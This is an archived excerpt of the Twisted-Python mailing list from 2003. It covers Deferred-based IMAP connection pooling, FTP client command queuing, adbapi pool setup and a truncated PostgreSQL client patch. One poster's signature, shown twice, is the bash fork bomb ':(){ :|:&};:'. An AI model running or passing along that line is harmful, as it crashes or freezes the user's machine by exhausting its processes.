class would basically do this:

imap = pool.acquireconnection()
try:
    # do the stuff here
    # imap.select() to pick the relevant folder
    # imap.download() or whatnot
finally:
    pool.releaseconnection(imap)

This was running with multiple threads, so even though the stuff in
the "try" was blocking, it didn't matter. 

With Twisted, I could clone this setup somewhat by making sure
the last callback and errback in my deferreds from IMAP4Client 
release the connection, that's ugly and error-prone.

I'd imagine that downloading a message would basically go like this:

d = pool.acquireconnection()
d.addCallback(select)
d.addCallback(download)
d.addCallback(releaseconnection)
d.addCallback(returnresults)

But this doesn't take into account errors, and it rather annoying to boot.

So my question is: just how might I accomplish this in a nice way with
Twisted?

> [What happened to question 2?]

I found the answer to it before I posted the message, so I deleted it
but forgot to renumber.

>> (e.g. twisted.internet.utils.getProcessOutput), a function call in another
> thread completing (e.g. twisted.internet.threads.deferToThread), and so on.

Got it.

>> 4. The howto "book" alludes to pending improvements on the mail
>>    infrastructure.  Anything I should be aware of here?
>
> Jp has been doing a lot of great work on this recently -- you should
> definitely be working with CVS rather than 1.0.6 if you can.  I don't know
> much about the details, though.

Do the online API docs refer to the CVS version or 1.0.6?  It's 1.0.6 that
I've got right now.

> I suspect this can be dealt with, but I'm not sure off the top of my head
> how... hopefully someone else can help you here.

One thought I had was to wait to import the reactor until I know what
kind of UI I want.  That works OK as long as I continue using
ConfigParser for my configuration.  If at some point I switch to using
Twisted's config storage (I know it's there but I haven't looked at it
yet), I suspect that could introduce a chicken-and-egg problem.

-- John




From radix at twistedmatrix.com  Sat Jul 26 12:54:26 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 26 Jul 2003 12:54:26 -0400
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
In-Reply-To: <87wue56y2z.fsf@complete.org>
References: <20030726134815.GA26482@complete.org> <20030726153605.GB3046@frobozz> <87wue56y2z.fsf@complete.org>
Message-ID: <20030726165426.GC25197@radii>

On Sat, Jul 26, 2003 at 11:40:20AM -0500, John Goerzen wrote:
> Andrew Bennetts <andrew-twisted at puzzling.org> writes:
> One thought I had was to wait to import the reactor until I know what
> kind of UI I want.  That works OK as long as I continue using
> ConfigParser for my configuration.  If at some point I switch to using
> Twisted's config storage (I know it's there but I haven't looked at it
> yet), I suspect that could introduce a chicken-and-egg problem.

No, Twisted is not a monolithic import, that would be insane. You can
import twisted.python.usage before importing the reactor.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From itamar at itamarst.org  Sat Jul 26 13:52:41 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 13:52:41 -0400
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
In-Reply-To: <87wue56y2z.fsf@complete.org>
References: <20030726134815.GA26482@complete.org>
	<20030726153605.GB3046@frobozz>
	<87wue56y2z.fsf@complete.org>
Message-ID: <20030726135241.478c1897.itamar@itamarst.org>

On Sat, 26 Jul 2003 11:40:20 -0500
John Goerzen <jgoerzen at complete.org> wrote:
 
> I'd imagine that downloading a message would basically go like this:
> 
> d = pool.acquireconnection()
> d.addCallback(select)
> d.addCallback(download)
> d.addCallback(releaseconnection)
> d.addCallback(returnresults)
> 
> But this doesn't take into account errors, and it rather annoying to
> boot.

There's an addErrback. If you read the Deferred docs, you'll
eventually figure out how Deferreds match Python's exception handling
mechanism almost exactly, just with asynchronous APIs.

> One thought I had was to wait to import the reactor until I know what
> kind of UI I want.  That works OK as long as I continue using
> ConfigParser for my configuration.  If at some point I switch to using
> Twisted's config storage (I know it's there but I haven't looked at it
> yet), I suspect that could introduce a chicken-and-egg problem.

You can always stick to ConfigParser, and for your needs it may be
better.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From itamar at itamarst.org  Sat Jul 26 13:55:14 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 13:55:14 -0400
Subject: [Twisted-Python] Re: Considering Twisted for OfflineIMAP
In-Reply-To: <87wue56y2z.fsf@complete.org>
References: <20030726134815.GA26482@complete.org>
	<20030726153605.GB3046@frobozz>
	<87wue56y2z.fsf@complete.org>
Message-ID: <20030726135514.0e4736c3.itamar@itamarst.org>

On Sat, 26 Jul 2003 11:40:20 -0500
John Goerzen <jgoerzen at complete.org> wrote:
 
> Do the online API docs refer to the CVS version or 1.0.6?  It's 1.0.6
> that I've got right now.

1.0.6. I recommed getting CVS and reading the code for IMAP. And the
tests!


-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From devmail at crazydiamonds.com  Sat Jul 26 20:22:37 2003
From: devmail at crazydiamonds.com (Michael Shyne)
Date: Sat, 26 Jul 2003 19:22:37 -0500 (CDT)
Subject: [Twisted-Python] submodel caching in woven
Message-ID: <49387.66.41.66.136.1059265357.squirrel@mail.gumption.com>

I'm trying to create a web-app in woven using already existing data
objects.  I'm starting by just trying to display a name.  This is what
I've done:

components.registerAdapter(model.ObjectWrapper, myObj, interfaces.IModel)
class DisplayObj(page.Page):

    templateFile = "display-obj.html"

    def wmfactory_obj(self, request):
        id = request.args.get('id', (0,))[0]

        if id:
            return objFactory.getObj(id)

        return None

The template only referes to "obj/name".  This all works fine... except
when I change the id in the URL and reload the page.  The name displayed
doesn't change.  The problem is with the submodel caching in the root
model (the page).  I've attached the changes I made to fix it.  I'm new to
woven (and twisted in general) so I don't know if I'm doing something
wrong, or if my changes have far-reaching effects.

I should note that these changes merely improved the situation to mostly
working (which, of course, is much better than never working).  The
caching is keyed off of "id(request)".  However, it seems there is object
caching occuring with the request objects, "id(request)" often returns
identical results.  I believe that the submodel caching will also have to
look at a timestamp to work consistently.  This was too big of a change to
make at this point.  But if the list agrees with my current changes and
thinks adding a timestamp comparison is the right way to go, I would be
more than happy to do it.

-Michael Shyne

-------------- next part --------------
A non-text attachment was scrubbed...
Name: model.diff
Type: application/octet-stream
Size: 607 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030726/1966f68a/attachment.obj 

From jgoerzen at complete.org  Sat Jul 26 21:28:53 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 20:28:53 -0500
Subject: [Twisted-Python] How can ftpclient.py work?
Message-ID: <87k7a47o6i.fsf@complete.org>

Hi,

I've been reading over the Twisted examples to learn the system and
one of them, ftpclient.py, has me flummoxed.  Specifically, the
connectionMade function near the end.

It issues a number of commands right in a row, without waiting for the
results to come back from the deferreds that they return.  To me this
seems bad because:

1. The system would have no way of knowing which command a particular
   response belongs to

2. Sending additional commands before the server is done with the
   first one may cause problems (for instance, if it takes a little
   while to fully transmit the first command, the second one could be
   transmitted in the middle)

3. There is no error-checking in there, so commands are issued that
   are dependant on the success of earlier ones (rnuning nlst after
   cdup, for instance), but they're issued potentially before the
   earlier ones have a chance to return an error.

Now, I'm assuming that these problems do not actually exist.  Yet I
cannot work out why not.  Can anybody shed some light?

Thanks,
John




From jgoerzen at complete.org  Sat Jul 26 21:38:30 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 20:38:30 -0500
Subject: [Twisted-Python] Connection poolin
Message-ID: <87brvg7nqh.fsf@complete.org>

Here is something I haven't been able to figure out yet.

I am using IMAP4Client from Twisted.

The behavior I used to use is this:
When I wanted to speak to the IMAP server in my multithreaded
application, I would call a function that returns me an IMAP
connection.  There was a limit on the number of connections open --
let's say 5 for this example.  If an open connection was available,
that function would return it to me immediately.  If 5 were already
open, it would block until one of those was freed.  Otherwise, it
would establish a new connection and return that to me.

My task as a caller was to always release the connection when done.
My pattern, then, was generally one of:

imap = self.imapserver.acquireconnection()
try:
    # select the appropriate mailbox
    # do stuff here
    return result
finally:
   self.imapserver.release(imap)

I have been trying to figure out how to do this the Twisted way.
Obviously blocking is right out.

I've thought that in each method I have that needs a connection, I
could write two methods: one that calls the Twisted version of
acquireconnection and sets its callback to the second, which does the
real work (and possibly chains to others via callbacks.)

There are some problems with that approach.  One is that it is very
verbose and requires a lot of code all over the place to manage.
Another is that there's no easy way to tell in Twisted when we are
done with the given connection.  I suppose I could always add errbacks
all along the way plus a callback, each of which releases the
connection, but that seems inconvenient and error-prone.

Basically, what I'm saying is that I can invent something that works,
but everything I've come up with seems like a nasty kludge, and I'm
looking for the Right Way to do it.

Thanks,
John




From andrew-twisted at puzzling.org  Sat Jul 26 22:19:22 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 27 Jul 2003 12:19:22 +1000
Subject: [Twisted-Python] How can ftpclient.py work?
In-Reply-To: <87k7a47o6i.fsf@complete.org>
References: <87k7a47o6i.fsf@complete.org>
Message-ID: <20030727021922.GC3046@frobozz>

On Sat, Jul 26, 2003 at 08:28:53PM -0500, John Goerzen wrote:
> Hi,
> 
> I've been reading over the Twisted examples to learn the system and
> one of them, ftpclient.py, has me flummoxed.  Specifically, the
> connectionMade function near the end.

It's worth noting that that example is meant more as a brief example of how
to use ftp.FTPClient, rather than as a real application.

> It issues a number of commands right in a row, without waiting for the
> results to come back from the deferreds that they return.  To me this
> seems bad because:
> 
> 1. The system would have no way of knowing which command a particular
>    response belongs to

I think you're referring to these parts:

    # Get the current working directory
    ftpClient.pwd().addCallbacks(success, fail)

    ... snip ...

    # Change to the parent directory
    ftpClient.cdup().addCallbacks(success, fail)

You're right, in a real application, you probably do want to distinguish
between the responses from these two commands.  That could be as simple as
having different success functions for different commands, e.g.

    ftpClient.pwd().addCallbacks(handlePWD, fail)
    ftpClient.cdup().addCallbacks(handleCDUP, fail)

Or you could pass extra arguments to the callbacks:

    # Using .addCallback
    ftpClient.pwd().addCallback(success, 'pwd').addErrback(fail)
    # Using .addCallbacks
    ftpClient.cdup().addCallbacks(success, fail, callbackArgs=('cdup,))

In that case, the success function might be defined as:

    def success(response, command):
        print 'Success!  Got response for command %r:' % (command,)
        print '---'
        if response is None:
            print None
        else:
            print string.join(response, '\n')
        print '---'

> 2. Sending additional commands before the server is done with the
>    first one may cause problems (for instance, if it takes a little
>    while to fully transmit the first command, the second one could be
>    transmitted in the middle)

This is not a problem for FTPClient -- it internally queues the commands and
issues them when the server is ready for them.

[In the case of FTP, Twisted's FTPClient doesn't attempt any funky
pipelining, so it's simply a matter of waiting for a response to the last
command if there's a response outstanding, otherwise it can be issued
immediately.  See the implementation of FTPClient.sendNextCommand and
FTPClient.lineReceiver (which calls sendNextCommand when appropriate) for
details.]

In general, though, most protocols would simply be doing something like:

    def sendRequest(self, data):
        # ...
        self.transport.write(self.requestHeader)
        self.transport.write(data)
        # ...

And the transport takes care of making sure the data is sent in the right
order.  You're probably thinking "but what if two calls are made to
sendRequest at the same time?  Isn't there a race condition?"  The answer is
technically yes -- very little of Twisted is thread-safe[1].  But in practice,
Twisted programs don't need to use threads to service multiple connections,
so you don't have to worry about these sorts of problems.  Only one thing
is happening at any one time in Twisted, the trick is to make sure none of
those things blocks so that *looks* like it's doing several things at once.

If you grep the Twisted source, you'll see that virtually nothing uses any
thread-locking tools like threading.Lock :)

[1] But if you need to safely call a function from a thread, you can use
    reactor.callFromThread, which will schedule that function to be called
    from the main event loop.

> 3. There is no error-checking in there, so commands are issued that
>    are dependant on the success of earlier ones (rnuning nlst after
>    cdup, for instance), but they're issued potentially before the
>    earlier ones have a chance to return an error.

In the case of doc/examples/ftpclient.py, the commands Deferreds' have
'fail' added as an errback.  It's defined as:

    def fail(error):
        print 'Failed.  Error was:'
        print error
        from twisted.internet import reactor
        reactor.stop()

So there's no problems there -- the error handler will shutdown the entire
program by calling reactor.stop().  Probably not what you want to do in a
real application, but sufficient for an example.

> Now, I'm assuming that these problems do not actually exist.  Yet I
> cannot work out why not.  Can anybody shed some light?

I hope I've shed some light for you -- let us know if you need more :)

-Andrew.




From sflist at ihonk.com  Sat Jul 26 23:10:26 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Sat, 26 Jul 2003 20:10:26 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
Message-ID: <200307262010.26039.sflist@ihonk.com>

Hi all, I'm new to Twisted, and it's about to show. :-) I hope you can help 
me.

I'm writing a PostgreSQL-backed XML-RPC server with Twisted 1.0.6 on Linux. My 
problem is that if I hammer it with repeated, high-speed queries from a 
client, the client receives a Fault 8002. I'm probably just not setting some 
limit variable somewhere high enough. Here's my server code:

from twisted.web import xmlrpc, server
from twisted.enterprise import adbapi
class takeOne(xmlrpc.XMLRPC):
    def xmlrpc_dbtest(self):
        dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL", host='127.0.0.1', \
		user='postgres', database='template1')
	dbpool.connect()
        d = adbapi.Augmentation(dbpool)
        result = d.runQuery("select * from auth where uname='foo'")
	dbpool.close()
        return result

(In an earlier iteration I'd omitted the "dbpool.close()" call. Putting that 
in made it work considerably better, but it still fails under heavy load.)

Individual queries from the interactive interpreter work fine:

[steve at lothar]$ python
>>> import xmlrpclib
>>> s = xmlrpclib.Server('http://localhost:7080/')
>>> s.dbtest()
[{'baseObj': ['foo', 'd00d']}]

But when I hit it hard for a simple load test, it goes for a few seconds and 
then falls over:

>>> while i < 500:
...     x = s.dbtest()
...     i = i + 1
...
Traceback (most recent call last):
  File "<stdin>", line 2, in ?
  File "/usr/lib/python2.2/xmlrpclib.py", line 821, in __call__
    return self.__send(self.__name, args)
  File "/usr/lib/python2.2/xmlrpclib.py", line 975, in __request
    verbose=self.__verbose
  File "/usr/lib/python2.2/xmlrpclib.py", line 853, in request
    return self.parse_response(h.getfile())
  File "/usr/lib/python2.2/xmlrpclib.py", line 896, in parse_response
    return u.close()
  File "/usr/lib/python2.2/xmlrpclib.py", line 571, in close
    raise apply(Fault, (), self._stack[0])
xmlrpclib.Fault: <Fault 8002: 'error'>

Afterwards the connection pool seems to still be available:

>>> s.dbtest()
[{'baseObj': ['foo', 'd00d']}]

But I've got lots of connections in process still:

[steve at lothar]$ netstat -atn
tcp        0      0 127.0.0.1:5432          127.0.0.1:48841         TIME_WAIT 
tcp        0      0 127.0.0.1:7080          127.0.0.1:48839         TIME_WAIT
(repeat these guys about 150 times each, plus several being serviced)

The connections eventually go away as (I presume) they get serviced.

So I expect I'm just hitting a database connection pooling limitation, as a 
similar test against an XML-RPC function which didn't access a database ran 
just fine. I'm not sure if the limitation is in Twisted, or in PyPgSQL, and I 
don't know enough about how to enable traceback logging in Twisted (is there 
any?) to tell. Ideally I'd like it to handle several thousand backlogged 
requests without burping.

Help! :-)

Thanks for your time,

Steve Freitas



From jgoerzen at complete.org  Sat Jul 26 23:34:54 2003
From: jgoerzen at complete.org (John Goerzen)
Date: Sat, 26 Jul 2003 22:34:54 -0500
Subject: [Twisted-Python] Re: How can ftpclient.py work?
References: <87k7a47o6i.fsf@complete.org> <20030727021922.GC3046@frobozz>
Message-ID: <871xwc7ich.fsf@complete.org>

Thanks for the excellent information, Andrew.  I have a few (really!)
follow-up questions:

Andrew Bennetts <andrew-twisted at puzzling.org> writes:

> In general, though, most protocols would simply be doing something like:
>
>     def sendRequest(self, data):
>         # ...
>         self.transport.write(self.requestHeader)
>         self.transport.write(data)
>         # ...
>
> And the transport takes care of making sure the data is sent in the right
> order.  You're probably thinking "but what if two calls are made to
> sendRequest at the same time?  Isn't there a race condition?"  The answer is

Oh sure, you guys just turn my whole approach to things on its side,
and now you know what I'm thinking?  Well, you're right :-)

But, wouldn't the above code have blocking problems, especially over
slow links or for large values of data?  (Say data is a 2MB string and
you're on a modem... does your UI freeze for 15 minutes?  Or is
write() another layer above the system call that does some sort of magic?)

I guess what I'm thinking here is that switching from multi-threaded
to poll() or select() isn't a "get out of jail free" card.  And while
I've written various C programs using select() and have a good idea
what the potential pitfalls are there, Twisted seems to live up to its
name just enough that I'm having a bit of trouble isolating them here :-)

> In the case of doc/examples/ftpclient.py, the commands Deferreds' have
> 'fail' added as an errback.  It's defined as:

Ahh.  I should have seen that.

>> Now, I'm assuming that these problems do not actually exist.  Yet I
>> cannot work out why not.  Can anybody shed some light?
>
> I hope I've shed some light for you -- let us know if you need more :)

Thanks -- all I need now is a small flashlight :-)

-- John




From itamar at itamarst.org  Sat Jul 26 23:37:22 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 23:37:22 -0400
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262010.26039.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com>
Message-ID: <20030726233722.0e7f6ad1.itamar@itamarst.org>

On Sat, 26 Jul 2003 20:10:26 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> from twisted.web import xmlrpc, server
> from twisted.enterprise import adbapi
> class takeOne(xmlrpc.XMLRPC):
>     def xmlrpc_dbtest(self):
>         dbpool = adbapi.ConnectionPool("pyPgSQL.PgSQL",
>         host='127.0.0.1', \
> 		user='postgres', database='template1')
> 	dbpool.connect()
>         d = adbapi.Augmentation(dbpool)
>         result = d.runQuery("select * from auth where uname='foo'")
> 	dbpool.close()
>         return result

Don't create a new database pool per request. Store one in the resource,
that is, create one __init__ and access it using self.dbpool. No need to
do connect(), either. That should solve it.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From sflist at ihonk.com  Sat Jul 26 23:50:00 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Sat, 26 Jul 2003 20:50:00 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <20030726233722.0e7f6ad1.itamar@itamarst.org>
References: <200307262010.26039.sflist@ihonk.com> <20030726233722.0e7f6ad1.itamar@itamarst.org>
Message-ID: <200307262050.00128.sflist@ihonk.com>

> Don't create a new database pool per request. Store one in the resource,
> that is, create one __init__ and access it using self.dbpool. No need to
> do connect(), either. That should solve it.

That worked beautifully! Thanks!

Is there any need for me to run dbpool.close() at any point?

Steve



From itamar at itamarst.org  Sat Jul 26 23:56:53 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sat, 26 Jul 2003 23:56:53 -0400
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262050.00128.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com>
	<20030726233722.0e7f6ad1.itamar@itamarst.org>
	<200307262050.00128.sflist@ihonk.com>
Message-ID: <20030726235653.6a096d79.itamar@itamarst.org>

On Sat, 26 Jul 2003 20:50:00 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> Is there any need for me to run dbpool.close() at any point?

At shutdown is probably a good idea. But it does this automatically,
so no need to do anything on your part.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From uwe at oss4u.com  Sun Jul 27 00:10:59 2003
From: uwe at oss4u.com (Uwe C. Schroeder)
Date: Sat, 26 Jul 2003 21:10:59 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262050.00128.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com> <20030726233722.0e7f6ad1.itamar@itamarst.org> <200307262050.00128.sflist@ihonk.com>
Message-ID: <200307262110.59017.uwe@oss4u.com>

On Saturday 26 July 2003 08:50 pm, Steve Freitas wrote:
> > Don't create a new database pool per request. Store one in the resource,
> > that is, create one __init__ and access it using self.dbpool. No need to
> > do connect(), either. That should solve it.
>
> That worked beautifully! Thanks!
>
> Is there any need for me to run dbpool.close() at any point?

If you use multiuser, I would close on logoff, otherwise the connection sticks 
around until the server exits.


	UC

--
Open Source Solutions 4U, LLC	2570 Fleetwood Drive
Phone:  +1 650 872 2425		San Bruno, CA 94066
Cell:   +1 650 302 2405		United States
Fax:    +1 650 872 2417




From sflist at ihonk.com  Sun Jul 27 01:07:08 2003
From: sflist at ihonk.com (Steve Freitas)
Date: Sat, 26 Jul 2003 22:07:08 -0700
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <20030726233722.0e7f6ad1.itamar@itamarst.org>
References: <200307262010.26039.sflist@ihonk.com> <20030726233722.0e7f6ad1.itamar@itamarst.org>
Message-ID: <200307262207.08955.sflist@ihonk.com>

BTW, is the resource's __init__ the proper place to do all your application 
specific startup stuff? I'm only planning on this XML-RPC server 
implementation serving one kind of application, so is it there that I'd want 
to jump through all the application-specific startup hurdles?

Thanks,

Steve



From itamar at itamarst.org  Sun Jul 27 01:55:55 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Sun, 27 Jul 2003 01:55:55 -0400
Subject: [Twisted-Python] Help w/ low adbapi connection pool limits?
In-Reply-To: <200307262207.08955.sflist@ihonk.com>
References: <200307262010.26039.sflist@ihonk.com>
	<20030726233722.0e7f6ad1.itamar@itamarst.org>
	<200307262207.08955.sflist@ihonk.com>
Message-ID: <20030727015555.6ee8499e.itamar@itamarst.org>

On Sat, 26 Jul 2003 22:07:08 -0700
Steve Freitas <sflist at ihonk.com> wrote:

> BTW, is the resource's __init__ the proper place to do all your
> application specific startup stuff? I'm only planning on this XML-RPC
> server implementation serving one kind of application, so is it there
> that I'd want to jump through all the application-specific startup
> hurdles?

Yep. If it's a more general system you'd have a
twisted.internet.app.ApplicationService, but for this it may be
overkill.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From andrew-twisted at puzzling.org  Sun Jul 27 03:36:02 2003
From: andrew-twisted at puzzling.org (Andrew Bennetts)
Date: Sun, 27 Jul 2003 17:36:02 +1000
Subject: [Twisted-Python] Re: How can ftpclient.py work?
In-Reply-To: <871xwc7ich.fsf@complete.org>
References: <87k7a47o6i.fsf@complete.org> <20030727021922.GC3046@frobozz> <871xwc7ich.fsf@complete.org>
Message-ID: <20030727073602.GD3046@frobozz>

On Sat, Jul 26, 2003 at 10:34:54PM -0500, John Goerzen wrote:
> Thanks for the excellent information, Andrew.  I have a few (really!)
> follow-up questions:
> 
> Andrew Bennetts <andrew-twisted at puzzling.org> writes:
> 
> > In general, though, most protocols would simply be doing something like:
> >
> >     def sendRequest(self, data):
> >         # ...
> >         self.transport.write(self.requestHeader)
> >         self.transport.write(data)
> >         # ...
> >
> > And the transport takes care of making sure the data is sent in the right
> > order.  You're probably thinking "but what if two calls are made to
> > sendRequest at the same time?  Isn't there a race condition?"  The answer is
> 
> Oh sure, you guys just turn my whole approach to things on its side,
> and now you know what I'm thinking?  Well, you're right :-)

:)

> But, wouldn't the above code have blocking problems, especially over
> slow links or for large values of data?  (Say data is a 2MB string and
> you're on a modem... does your UI freeze for 15 minutes?  Or is
> write() another layer above the system call that does some sort of magic?)

transport.write doesn't block.  It simply queues the data to be written,
and then immediately returns (actually, if there's nothing queued, it'll try
a non-blocking write immediately -- see
twisted.internet.abstract.FileDescriptor.write for the gory details...).
So, yes, it's a layer above the system call.  A transport is an ITransport
implementor, not the bare socket object.

That said, for large transfers, using producers/consumers might be a better
idea anyway.  An example of this is twisted.web.static.FileTransfer.

> I guess what I'm thinking here is that switching from multi-threaded
> to poll() or select() isn't a "get out of jail free" card.  And while
> I've written various C programs using select() and have a good idea
> what the potential pitfalls are there, Twisted seems to live up to its
> name just enough that I'm having a bit of trouble isolating them here :-)

It's not "get out of jail free", but it's pretty close ;)

> > I hope I've shed some light for you -- let us know if you need more :)
> 
> Thanks -- all I need now is a small flashlight :-)

If you just look at twisted.flashlight... -- oh, wait, we haven't written
that one yet ;)

-Andrew.




From tv at twistedmatrix.com  Sun Jul 27 05:00:03 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sun, 27 Jul 2003 12:00:03 +0300
Subject: [Twisted-Python] Connection poolin
In-Reply-To: <87brvg7nqh.fsf@complete.org>
References: <87brvg7nqh.fsf@complete.org>
Message-ID: <20030727090003.GB28434@lapdog>

On Sat, Jul 26, 2003 at 08:38:30PM -0500, John Goerzen wrote:
> imap = self.imapserver.acquireconnection()
> try:
>     # select the appropriate mailbox
>     # do stuff here
>     return result
> finally:
>    self.imapserver.release(imap)

	Here's two quick hacks that differ mostly in where you put
	the connection release, and how you organize the deferreds.

	Method 1: manage the release in the caller, but need to jump
	through hoops to get the connection passed to
	_releaseConnection. self.imapserver.acquireconnection() is
	of the traditional "returns a Deferred" style.

class Something:
    def startDoingStuff(self):
	d = self.imapserver.acquireconnection()
	d.addCallback(self._gotConnection)
	return d

    def _gotConnection(self, connection):
	d = defer.Deferred()
	d.addCallback(self._doStuff)
	d.addBoth(self._releaseConnection, connection)
	d.callback(connection)
	return d

    def _doStuff(self, connection):
	# select the appropriate mailbox
	# do stuff here

    def _releaseConnection(self, stuff, connection):
	connection.release()
	return stuff


	Method 2: manage the release in the connection pool. Needs
	to change the API of acquireconnection into taking a deferred,
	as otherwise it would be impossible to make _doStuff get called
	before the connection release. Note how close this is to the above,
	with just release logic located in the same class as
	acquireconnection.

class SomethingBetter:
    def startDoingStuff(self):
	d = defer.Deferred()
	d.addCallback(self._doStuff)
	self.imapserver.acquireconnection(d)
	return d

    def _doStuff(self, connection):
	# select the appropriate mailbox
	# do stuff here

class ...:
    def acquireconnection(self, d):
	d2 = self._grabConnection()
	d2.addCallback(self._gotConnection, d)
	d2.chainCallback(d)

    def _gotConnection(self, connection, d):
	d.addBoth(self._releaseConnection, connection)
	return connection

    def _releaseConnection(self, stuff, connection):
	connection.release()
	return stuff

> I've thought that in each method I have that needs a connection, I
> could write two methods: one that calls the Twisted version of
> acquireconnection and sets its callback to the second, which does the
> real work (and possibly chains to others via callbacks.)
> 
> There are some problems with that approach.  One is that it is very
> verbose and requires a lot of code all over the place to manage.
> Another is that there's no easy way to tell in Twisted when we are
> done with the given connection.  I suppose I could always add errbacks
> all along the way plus a callback, each of which releases the
> connection, but that seems inconvenient and error-prone.

	I don't think the method 2 above is verbose. And there is no reason
	to add errbacks "all along the way". Just a single addBoth is
	enough. When the .addBoth callback returns it's first arg, it
	pretty much equals python exception handling try: ... finally: ...

-- 
:(){ :|:&};:



From tv at twistedmatrix.com  Sun Jul 27 04:34:00 2003
From: tv at twistedmatrix.com (Tommi Virtanen)
Date: Sun, 27 Jul 2003 11:34:00 +0300
Subject: [Twisted-Python] Re: How can ftpclient.py work?
In-Reply-To: <871xwc7ich.fsf@complete.org>
References: <87k7a47o6i.fsf@complete.org> <20030727021922.GC3046@frobozz> <871xwc7ich.fsf@complete.org>
Message-ID: <20030727083400.GA28434@lapdog>

On Sat, Jul 26, 2003 at 10:34:54PM -0500, John Goerzen wrote:
> But, wouldn't the above code have blocking problems, especially over
> slow links or for large values of data?  (Say data is a 2MB string and
> you're on a modem... does your UI freeze for 15 minutes?  Or is
> write() another layer above the system call that does some sort of magic?)

	Well, the UI won't really freeze; self.transport.write()
	will just buffer that 2MB inside the transport, and send
	from the buffer whenever the socket is ready.

	Of course, 2MB is quite a lot to buffer, and 100MB would
	be insane in a "normal" application. That's why, when you have
	lots of data, you use the producer/consumer pattern. See
	twisted.internet.interfaces classes IConsumer, IProducer and
	friends; though they are quite rarely used in normal apps,
	and you won't likely ever need them.

> I guess what I'm thinking here is that switching from multi-threaded
> to poll() or select() isn't a "get out of jail free" card.  And while

	There's no such thing as "easy complex". That's why protocol and
	application designers should avoid design decision that require
	complex code to support.

	However, for the easy cases, it goes something like this:

	1. simplest: single process, single protocol chat
	2. quite easy: asynchronous single process, many protocol chats
	3. starts as easy and explodes later: threads, many protocol chats

	Asynchronous programming removes most the time-related
	variance in program behaviour; that is, it helps you write
	more predictable code (very few race conditions compared to
	threads). And when you get used to it, the state machine
	thinking is just nice.

> I've written various C programs using select() and have a good idea
> what the potential pitfalls are there, Twisted seems to live up to its
> name just enough that I'm having a bit of trouble isolating them here :-)

	Twisted actually removes most of the pitfalls you fight with
	when doing your own event loop from scratch; that's the main
	reason to use Twisted for me. Of course, the bundled protocols
	etc. are nice, too.

> >> Now, I'm assuming that these problems do not actually exist.  Yet I
> >> cannot work out why not.  Can anybody shed some light?
> > I hope I've shed some light for you -- let us know if you need more :)
> Thanks -- all I need now is a small flashlight :-)

	We could always get some rags and lighter fluid, and make torches
	from our cluesticks ;)


/me notes he writes too much drivel. Blame it one the sunday morning.

-- 
:(){ :|:&};:



From sune at mel.interspace.dk  Sun Jul 27 07:28:28 2003
From: sune at mel.interspace.dk (Sune Kirkeby)
Date: Sun, 27 Jul 2003 13:28:28 +0200
Subject: [Twisted-Python] Postgres client
Message-ID: <20030727112828.GA29396@mel.interspace.dk>

Hello twisted people.

People have expressed interest in the postgres client I wrote for
twisted waaay back, so here it is.

It's got the packet parsing/formatting, and a weird sort of
interface, so afaik all it really needs is integration with the rest
of twisted (enterprise?), and postgres -> python type mappings
(/usr/include/postgresql/server/catalog/pg_type.h has the postgres
type identifiers listed).

The code is license-less as it is in the patch, but you may consider
it licensed under the LGPL, and I give Glyph non-exclusive
copyrights to the code. There, that should make it twisted-friendly.
I hope.

Enjoy,

/s

-- 
Sune Kirkeby | If humans were supposed to fly they'd
             | be born with stewardesses.
-------------- next part --------------
diff --exclude-from=diffignore -Naur Twisted-0.12.3/doc/examples/postgresql.py Twisted/doc/examples/postgresql.py
--- Twisted-0.12.3/doc/examples/postgresql.py	Thu Jan  1 01:00:00 1970
+++ Twisted/doc/examples/postgresql.py	Tue Jan  1 22:27:04 2002
@@ -0,0 +1,32 @@
+from twisted.enterprise import spock
+from twisted.protocols import postgresql
+from twisted.internet import main
+from twisted.internet import tcp
+
+class Consumer:
+    def __init__(self, prefix):
+        self.done = 0
+        self.count = 0
+        self.prefix = prefix
+
+    def receivedRow(self, types, data):
+        assert len(types) == len(data)
+        assert not self.done
+
+        self.count = self.count + 1
+        if self.count % 100 == 0:
